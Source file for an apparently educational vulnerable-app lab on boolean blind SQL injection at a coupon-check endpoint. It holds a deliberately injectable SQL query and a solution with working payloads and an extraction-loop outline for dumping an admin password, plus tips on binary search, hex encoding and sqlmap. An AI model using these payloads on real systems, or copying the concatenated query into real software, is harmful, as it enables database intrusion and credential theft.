"""优惠券查询处的布尔盲注。

业务场景是"输入优惠券码，看它有没有效"。

这个接口把三个信号全堵上了：

  · **不回显数据** —— 只回"有效 / 无效"这一句话
  · **不回显报错** —— 出错了也回同一句话
  · **没有时间信号** —— 语句是毫秒级的，而且它跟真假的耗时分不出来

剩下的只有一个**布尔值**：有效 / 无效。

这一题就是讲这件事：**当页面只有两种状态的时候，怎么把数据从里面读出来。**

这属于盲注里最常见的一种（比时间盲注常见得多），而且在真实的
"接口只返回成功/失败"的系统上到处都能碰到。
"""

import sqlite3

from vuln4all import Vuln, render_template, request

DB_NAME = "coupon.db"

#: admin 的密码。这一题的目标是把它**完整猜出来并提交**。
SECRET = "v9k2mq"
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"

#: 系统里真实存在的券码。正常查询能命中这些。
REAL_CODES = ("WELCOME10", "VIP2026", "NEWUSER")

GOAL_CHANNEL = "让页面在「无效」的输入上回出「有效」（布尔信道建立了）"
GOAL_EXTRACTED = "把 admin 的密码完整猜出来并提交"


class BooleanBlind(Vuln):
    info = {
        "name": "优惠券查询处的布尔盲注",
        "author": ["guaidao2"],
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "difficulty": "困难",
        "description": (
            "优惠券查询只回一句话：「有效」或者「无效」。\n"
            "没有数据回显、没有报错、也没有时间信号 —— 剩下的是一个**布尔值**。\n"
            "这一题讲的就是：只有两种状态的时候，怎么把数据一位一位问出来。"
        ),
        "hint": (
            "先输一个错的券码，再输一个对的，看页面回什么。\n"
            "然后注意这个查询的形状：它大概是 `WHERE code = '<你输入>'`。\n"
            "那么想一想：如果我在引号后面接一个 `OR`，而这个 `OR` 的条件\n"
            "是从**别的表**里查出来的 —— 页面回的那句话会不会跟着变？\n"
            "如果可以，你就把「有没有这条券」变成了「某个条件成不成立」，\n"
            "也就是一个**一位一位的开关**。\n"
            "接着考虑效率：\n"
            "  · 一位一位从 a 试到 z，一位要 36 次请求\n"
            "  · 用 `>` 做**二分**，一位只要 6 次\n"
            "  · 用 `hex()` 把字符集从 36 个压到 16 个\n"
            "  · `group_concat()` 能一次拖一整列\n"
            "目标密码是 6 位，字符集是小写字母加数字。"
        ),
        "solution": (
            "一、先建立信道。基线是「无效」，想办法让它变「有效」：\n\n"
            "     ' OR 1=1 -- \n\n"
            "   页面从「无效」变成「有效」—— 信道就通了。\n"
            "   （顺带确认：`--` 后面那个空格不能少，它是注释符的一部分。）\n\n"
            "二、把条件换成「从别的表里查出来的」：\n\n"
            "     ' OR (SELECT 1 FROM users WHERE username='admin'\n"
            "             AND substr(password,1,1)='v') -- \n\n"
            "   慢？不慢 —— 快慢无所谓，看的是**页面那句话**：\n"
            "     「有效」= 猜对了\n"
            "     「无效」= 猜错了\n\n"
            "三、一位一位走完：把 `substr(password,1,1)` 的第二个参数从 1 数到 6。\n"
            "   手点 200 多次不现实，写脚本：\n\n"
            "     for pos in 1..6:\n"
            "         for ch in 'abcdefghijklmnopqrstuvwxyz0123456789':\n"
            "             payload = (\"' OR (SELECT 1 FROM users WHERE username='admin'\"\n"
            "                        \" AND substr(password,%d,1)='%s') -- \" % (pos, ch))\n"
            "             发请求，看页面回的是「有效」还是「无效」\n"
            "             if 有效: 记下 ch; break\n\n"
            "四、猜完把密码提交到页面下面的框里。\n\n"
            "怎么更快（这一节是重点）：\n\n"
            "  一、**先用 `length()` 问出长度**，省得不知道边界：\n"
            "       ' OR (SELECT length(password) FROM users WHERE username='admin')=6 -- \n"
            "     进一步：长度也能二分 —— `> 5`。\n\n"
            "  二、**二分代替逐字符**。别问「等于哪个」，问「比哪个大」：\n"
            "       ' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')>'m' -- \n"
            "     36 个字符 → 6 次（log2(36) ≈ 5.2）。一位从 36 次降到 6 次。\n\n"
            "  三、**换字符集**。用 `unicode()` 问数字，或者用 `hex()` 把字符集\n"
            "     从 36 个压到 16 个（0-9a-f）：\n"
            "       ' OR (SELECT substr(hex(password),1,1) FROM users WHERE username='admin')='7' -- \n"
            "     而 `hex()` 出来的每个十六进制位其实可以**一次问 4 个 bit** ——\n"
            "     理论上一位十六进制字符只要 4 次二分。\n\n"
            "  四、**一次拖一整列**。如果目标不是单个值而是一列：\n"
            "       SELECT group_concat(username||':'||password,'~') FROM users\n"
            "     把它当成一个长字符串去问，一次会话就拿全了 —— 不用对每一行重来。\n\n"
            "  五、**能回显就别盲注**。这一节最实用：先花时间找找有没有\n"
            "     UNION 的位置、有没有报错回显、有没有别的接口能读到同一份数据。\n"
            "     盲注永远是最后手段，因为它慢得离谱。\n\n"
            "现实中的工具：\n\n"
            "  sqlmap 的 `--technique=B` 就是布尔盲注，它会自动做二分、\n"
            "  自动判断真假、自动找最优的 payload。但它的前提是你能给它一个\n"
            "  「真假怎么区分」的判据 —— 在真实系统里，这往往是最花时间的一步。"
        ),
        "refs": [
            "https://portswigger.net/web-security/sql-injection/blind",
            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / DB_NAME))
        con.executescript(
            """
            CREATE TABLE coupons (
                code   TEXT PRIMARY KEY,
                amount REAL NOT NULL
            );
            CREATE TABLE users (
                username TEXT PRIMARY KEY,
                password TEXT NOT NULL
            );
            """
        )
        con.executemany(
            "INSERT INTO coupons (code, amount) VALUES (?,?)",
            [(c, 10.0 + i * 5) for i, c in enumerate(REAL_CODES)],
        )
        con.execute(
            "INSERT INTO users (username, password) VALUES (?,?)", ("admin", SECRET)
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        db_path = str(ctx.workspace / DB_NAME)

        @app.route("/")
        def index():
            return render_template(
                "index.html",
                typed="",
                valid=None,
                feedback=None,
                length=len(SECRET),
                alphabet_size=len(ALPHABET),
            )

        @app.route("/check", methods=["POST"])
        def check_code():
            typed = request.form.get("code", "")
            feedback = None
            valid = None

            if request.method == "POST" and "code" in request.form:
                # ↓↓↓ 洞就在这里：券码直接拼进 SQL ↓↓↓
                sql = "SELECT 1 FROM coupons WHERE code = '%s'" % typed
                # ↑↑↑ 正确做法：con.execute("... WHERE code = ?", (typed,)) ↑↑↑

                try:
                    con = sqlite3.connect(db_path)
                    try:
                        valid = con.execute(sql).fetchone() is not None
                    finally:
                        con.close()
                except sqlite3.Error:
                    # 报错也说"无效" —— 这一题连报错都不给你
                    valid = False

                # 判定一：一个**无效**的输入，却让页面回了「有效」——
                # 那只能是注入把条件改成了真。
                if valid and "'" in typed:
                    ctx.progress.mark(GOAL_CHANNEL)

            elif "guess" in request.form:
                # 第二个表单：提交猜出来的密码
                guess = request.form.get("guess", "").strip()
                if guess:
                    if guess == SECRET:
                        ctx.progress.mark(GOAL_EXTRACTED)
                        feedback = ("ok", "密码对了。")
                    else:
                        feedback = ("bad", "不对。")

            return render_template(
                "index.html",
                typed=typed if "code" in request.form else "",
                valid=valid,
                feedback=feedback,
                length=len(SECRET),
                alphabet_size=len(ALPHABET),
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {
            GOAL_CHANNEL: ctx.progress.achieved(GOAL_CHANNEL),
            GOAL_EXTRACTED: ctx.progress.achieved(GOAL_EXTRACTED),
        }
